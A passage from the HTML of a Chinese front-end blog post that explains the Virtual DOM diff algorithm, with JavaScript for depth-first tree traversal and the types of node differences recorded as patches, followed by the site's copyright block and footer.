<span style="color:#998;font-style:italic">// 对两棵树进行深度优先遍历
</span><span style="color:#998;font-style:italic"></span><span style="color:#000;font-weight:bold">function</span> dfsWalk (oldNode, newNode, index, patches) {
  <span style="color:#998;font-style:italic">// 对比oldNode和newNode的不同，记录下来
</span><span style="color:#998;font-style:italic"></span>  patches[index] <span style="color:#000;font-weight:bold">=</span> [...]

  diffChildren(oldNode.children, newNode.children, index, patches)
}

<span style="color:#998;font-style:italic">// 遍历子节点
</span><span style="color:#998;font-style:italic"></span><span style="color:#000;font-weight:bold">function</span> diffChildren (oldChildren, newChildren, index, patches) {
  <span style="color:#000;font-weight:bold">var</span> leftNode <span style="color:#000;font-weight:bold">=</span> <span style="color:#000;font-weight:bold">null</span>
  <span style="color:#000;font-weight:bold">var</span> currentNodeIndex <span style="color:#000;font-weight:bold">=</span> index
  oldChildren.forEach(<span style="color:#000;font-weight:bold">function</span> (child, i) {
    <span style="color:#000;font-weight:bold">var</span> newChild <span style="color:#000;font-weight:bold">=</span> newChildren[i]
    currentNodeIndex <span style="color:#000;font-weight:bold">=</span> (leftNode <span style="color:#000;font-weight:bold">&amp;&amp;</span> leftNode.count) <span style="color:#998;font-style:italic">// 计算节点的标识
</span><span style="color:#998;font-style:italic"></span>      <span style="color:#000;font-weight:bold">?</span> currentNodeIndex <span style="color:#000;font-weight:bold">+</span> leftNode.count <span style="color:#000;font-weight:bold">+</span> <span style="color:#099">1</span>
      <span style="color:#000;font-weight:bold">:</span> currentNodeIndex <span style="color:#000;font-weight:bold">+</span> <span style="color:#099">1</span>
    dfsWalk(child, newChild, currentNodeIndex, patches) <span style="color:#998;font-style:italic">// 深度遍历子节点
</span><span style="color:#998;font-style:italic"></span>    leftNode <span style="color:#000;font-weight:bold">=</span> child
  })
}
</code></pre></td></tr></table>
</div>
</div><p>例如，上面的div和新的div有差异，当前的标记是0，那么：</p>
<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">patches[<span style="color:#099">0</span>] <span style="color:#000;font-weight:bold">=</span> [{difference}, {difference}, ...] <span style="color:#998;font-style:italic">// 用数组存储新旧节点的不同
</span></code></pre></td></tr></table>
</div>
</div><h5 id="322-差异类型">3.2.2 差异类型</h5>
<p>上面说的节点的差异指的是什么呢？对 DOM 操作可能会：</p>
<ol>
<li>替换掉原来的节点，例如把上面的div换成了section</li>
<li>移动、删除、新增子节点，例如上面div的子节点，把p和ul顺序互换</li>
<li>修改了节点的属性</li>
<li>对于文本节点，文本内容可能会改变。例如修改上面的文本节点2内容为Virtual DOM 2。</li>
</ol>
<p>所以我们定义了几种差异类型：</p>
<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#000;font-weight:bold">var</span> REPLACE <span style="color:#000;font-weight:bold">=</span> <span style="color:#099">0</span>
<span style="color:#000;font-weight:bold">var</span> REORDER <span style="color:#000;font-weight:bold">=</span> <span style="color:#099">1</span>
<span style="color:#000;font-weight:bold">var</span> PROPS <span style="color:#000;font-weight:bold">=</span> <span style="color:#099">2</span>
<span style="color:#000;font-weight:bold">var</span> TEXT <span style="color:#000;font-weight:bold">=</span> <span style="color:#099">3</span>
</code></pre></td></tr></table>
</div>
</div><p>对于节点替换，很简单。判断新旧节点的tagName和是不是一样的，如果不一样的说明需要替换掉。如div换成section，就记录下：</p>
<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">patches[<span style="color:#099">0</span>] <span style="color:#000;font-weight:bold">=</span> [{
  type<span style="color:#000;font-weight:bold">:</span> REPALCE,
  node<span style="color:#000;font-weight:bold">:</span> newNode <span style="color:#998;font-style:italic">// el(&#39;section&#39;, props, children)
</span><span style="color:#998;font-style:italic"></span>}]
</code></pre></td></tr></table>
</div>
</div>
    </div>

    
    
<div class="post-copyright">
  <p class="copyright-item">
    <span class="item-title">文章作者</span>
    <span class="item-content">bomir</span>
  </p>
  <p class="copyright-item">
    <span class="item-title">上次更新</span>
    <span class="item-content">
      2018-05-06
      
    </span>
  </p>
  
  <p class="copyright-item">
    <span class="item-title">许可协议</span>
    <span class="item-content"><a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank">CC BY-NC-ND 4.0</a></span>
  </p>
</div>


    
    

    <footer class="post-footer">
      <div class="post-tags">
          <a href="http://localhost:1313/tags/%E5%89%8D%E7%AB%AF/">前端</a>
          
        </div>

      
      <nav class="post-nav">
        
          <a class="prev" href="/post/frount-end-300/">
            
            <i class="iconfont">
              <svg  class="icon" viewBox="0 0 1024 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="18" height="18">
  <path d="M691.908486 949.511495l75.369571-89.491197c10.963703-12.998035 10.285251-32.864502-1.499144-44.378743L479.499795 515.267417 757.434875 204.940602c11.338233-12.190647 11.035334-32.285311-0.638543-44.850487l-80.46666-86.564541c-11.680017-12.583596-30.356378-12.893658-41.662889-0.716314L257.233596 494.235404c-11.332093 12.183484-11.041474 32.266891 0.657986 44.844348l80.46666 86.564541c1.772366 1.910513 3.706415 3.533476 5.750981 4.877077l306.620399 321.703933C662.505829 963.726242 680.945807 962.528973 691.908486 949.511495z"></path>
</svg>

            </i>
            <span class="prev-text nav-default">前端300题</span>
            <span class="prev-text nav-mobile">上一篇</span>
          </a>
        
          <a class="next" href="/post/frount-end-materials/">
            <span class="next-text nav-default">前端学习资料</span>
            <span class="prev-text nav-mobile">下一篇</span>
            
            <i class="iconfont">
              <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="18" height="18">
  <path d="M332.091514 74.487481l-75.369571 89.491197c-10.963703 12.998035-10.285251 32.864502 1.499144 44.378743l286.278095 300.375162L266.565125 819.058374c-11.338233 12.190647-11.035334 32.285311 0.638543 44.850487l80.46666 86.564541c11.680017 12.583596 30.356378 12.893658 41.662889 0.716314l377.434212-421.426145c11.332093-12.183484 11.041474-32.266891-0.657986-44.844348l-80.46666-86.564541c-1.772366-1.910513-3.706415-3.533476-5.750981-4.877077L373.270379 71.774697C361.493148 60.273758 343.054193 61.470003 332.091514 74.487481z"></path>
</svg>

            </i>
          </a>
      </nav>
    </footer>
  </article>

  
  

  
  

  

  
  

  

  

  

    

  

        </div>
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="icon-links">
  
  
    <a href="mailto:jinchunw@385@gmail.com" rel="me noopener" class="iconfont"
      title="email" >
      <svg class="icon" viewBox="0 0 1451 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="36" height="36">
  <path d="M664.781909 681.472759 0 97.881301C0 3.997201 71.046997 0 71.046997 0L474.477909 0 961.649408 0 1361.641813 0C1361.641813 0 1432.688811 3.997201 1432.688811 97.881301L771.345323 681.472759C771.345323 681.472759 764.482731 685.154773 753.594283 688.65053L753.594283 688.664858C741.602731 693.493018 729.424896 695.068979 718.077952 694.839748 706.731093 695.068979 694.553173 693.493018 682.561621 688.664858L682.561621 688.65053C671.644501 685.140446 664.781909 681.472759 664.781909 681.472759L664.781909 681.472759ZM718.063616 811.603883C693.779541 811.016482 658.879232 802.205449 619.10784 767.734955 542.989056 701.759633 0 212.052267 0 212.052267L0 942.809523C0 942.809523 0 1024 83.726336 1024L682.532949 1024 753.579947 1024 1348.948139 1024C1432.688811 1024 1432.688811 942.809523 1432.688811 942.809523L1432.688811 212.052267C1432.688811 212.052267 893.138176 701.759633 817.019477 767.734955 777.248 802.205449 742.347691 811.03081 718.063616 811.603883L718.063616 811.603883Z"></path>
</svg>

    </a>
  
    <a href="https://github.com/Bicomir" rel="me noopener" class="iconfont"
      title="github"  target="_blank"
      >
      <svg class="icon" style="" viewBox="0 0 1024 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="36" height="36">
  <path d="M512 12.672c-282.88 0-512 229.248-512 512 0 226.261333 146.688 418.133333 350.08 485.76 25.6 4.821333 34.986667-11.008 34.986667-24.618667 0-12.16-0.426667-44.373333-0.64-87.04-142.421333 30.890667-172.458667-68.693333-172.458667-68.693333C188.672 770.986667 155.008 755.2 155.008 755.2c-46.378667-31.744 3.584-31.104 3.584-31.104 51.413333 3.584 78.421333 52.736 78.421333 52.736 45.653333 78.293333 119.850667 55.68 149.12 42.581333 4.608-33.109333 17.792-55.68 32.426667-68.48-113.706667-12.8-233.216-56.832-233.216-253.013333 0-55.893333 19.84-101.546667 52.693333-137.386667-5.76-12.928-23.04-64.981333 4.48-135.509333 0 0 42.88-13.738667 140.8 52.48 40.96-11.392 84.48-17.024 128-17.28 43.52 0.256 87.04 5.888 128 17.28 97.28-66.218667 140.16-52.48 140.16-52.48 27.52 70.528 10.24 122.581333 5.12 135.509333 32.64 35.84 52.48 81.493333 52.48 137.386667 0 196.693333-119.68 240-233.6 252.586667 17.92 15.36 34.56 46.762667 34.56 94.72 0 68.522667-0.64 123.562667-0.64 140.202666 0 13.44 8.96 29.44 35.2 24.32C877.44 942.592 1024 750.592 1024 524.672c0-282.752-229.248-512-512-512"></path>
</svg>

    </a>


<a href="http://localhost:1313/index.xml" rel="noopener alternate" type="application/rss&#43;xml"
    class="iconfont" title="rss" target="_blank">
    <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="30" height="30">
  <path d="M819.157333 1024C819.157333 574.592 449.408 204.8 0 204.8V0c561.706667 0 1024 462.293333 1024 1024h-204.842667zM140.416 743.04a140.8 140.8 0 0 1 140.501333 140.586667A140.928 140.928 0 0 1 140.074667 1024C62.72 1024 0 961.109333 0 883.626667s62.933333-140.544 140.416-140.586667zM678.784 1024h-199.04c0-263.210667-216.533333-479.786667-479.744-479.786667V345.173333c372.352 0 678.784 306.517333 678.784 678.826667z"></path>
</svg>

  </a>
   
</div>

<div class="copyright">
  <span class="power-by">
    Powered by <a class="hexo-link" href="https://gohugo.io">Hugo</a>
  </span>
  <span class="division">|</span>
  <span class="theme-info">
    Theme - <a class="theme-link" href="https://github.com/xianmin/hugo-theme-jane">Jane</a>
  </span>

  <span class="copyright-year">
    &copy;
    
      2017 -
    2021
    <span class="heart">
      
      <i class="iconfont">
        <svg class="icon" viewBox="0 0 1025 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="14" height="14">
  <path d="M1000.1 247.9c-15.5-37.3-37.6-70.6-65.7-98.9-54.4-54.8-125.8-85-201-85-85.7 0-166 39-221.4 107.4C456.6 103 376.3 64 290.6 64c-75.1 0-146.5 30.4-201.1 85.6-28.2 28.5-50.4 61.9-65.8 99.3-16 38.8-24 79.9-23.6 122.2 0.7 91.7 40.1 177.2 108.1 234.8 3.1 2.6 6 5.1 8.9 7.8 14.9 13.4 58 52.8 112.6 102.7 93.5 85.5 209.9 191.9 257.5 234.2 7 6.1 15.8 9.5 24.9 9.5 9.2 0 18.1-3.4 24.9-9.5 34.5-30.7 105.8-95.9 181.4-165 74.2-67.8 150.9-138 195.8-178.2 69.5-57.9 109.6-144.4 109.9-237.3 0.1-42.5-8-83.6-24-122.2z"
   fill="#8a8a8a"></path>
</svg>

      </i>
    </span><span class="author">
        bomir
        
      </span></span>

  
  

  
</div>

    </footer>

    <div class="back-to-top" id="back-to-top">
      <i class="iconfont">
        
        <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="35" height="35">
  <path d="M510.866688 227.694839 95.449397 629.218702l235.761562 0-2.057869 328.796468 362.40389 0L691.55698 628.188232l241.942331-3.089361L510.866688 227.694839zM63.840492 63.962777l894.052392 0 0 131.813095L63.840492 195.775872 63.840492 63.962777 63.840492 63.962777zM63.840492 63.962777"></path>
</svg>

      </i>
    </div>
  </div>
  
<script type="text/javascript" src="/lib/jquery/jquery-3.2.1.min.js"></script>
  <script type="text/javascript" src="/lib/slideout/slideout-1.0.1.min.js"></script>




<script type="text/javascript" src="/js/main.dee43230127a73d039a734510fa896c89c3c7ce0cf0be0c7a7433f8fd69b76dc.js" integrity="sha256-3uQyMBJ6c9A5pzRRD6iWyJw8fODPC&#43;DHp0M/j9abdtw=" crossorigin="anonymous"></script>












  
    <script type="text/javascript" src="/js/load-photoswipe.js"></script>
    <script type="text/javascript" src="/lib/photoswipe/photoswipe.min.js"></script>
    <script type="text/javascript" src="/lib/photoswipe/photoswipe-ui-default.min.js"></script>
  















</body>
</html>
